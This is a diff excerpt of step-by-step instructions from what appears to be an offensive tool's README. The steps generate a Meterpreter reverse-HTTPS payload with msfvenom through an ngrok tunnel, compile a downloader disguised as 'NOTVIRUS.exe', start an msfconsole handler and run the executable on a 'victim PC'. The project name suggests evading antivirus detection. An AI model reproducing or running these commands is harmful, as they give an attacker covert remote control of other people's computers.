@@ -25,14 +25,14 @@ rm -f www.example.com.key  www.example.com.crt
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=NGROK_TCP_IP lport=NGROK_TCP_PORT HandlerSSLCert=ABSOLUTE_PATH_TO_THIS_DIR/www.example.com.pem StagerVerifySSLCert=true -f raw > bincode.bin
 5. Configure src/main.cpp (in int main() change const char* url = "YOUR_HTTP_IP/bincode.bin")
 6. Compile exe
-x86_64-w64-mingw32-g++ -o NOTVIRUS.exe src/*.cpp -static -static-libgcc -static-libstdc++ -lwininet -mwindows
+x86_64-w64-mingw32-g++ -o NOTVIRUS.exe src/main.cpp -static -static-libgcc -static-libstdc++ -lwininet -mwindows
 7. Start msfconsole
 msfconsole
 use exploit/multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set lhost 0.0.0.0
 set lport 9999
-set HandlerSSLCert /home/kali/meterpreter_undetected_without_compiler/www.example.com.pem
+set HandlerSSLCert ABSOLUTE_PATH_TO_THIS_DIR/www.example.com.pem
 set StagerVerifySSLCert true
 run
 8. start NOTVIRUS.exe on victim PC
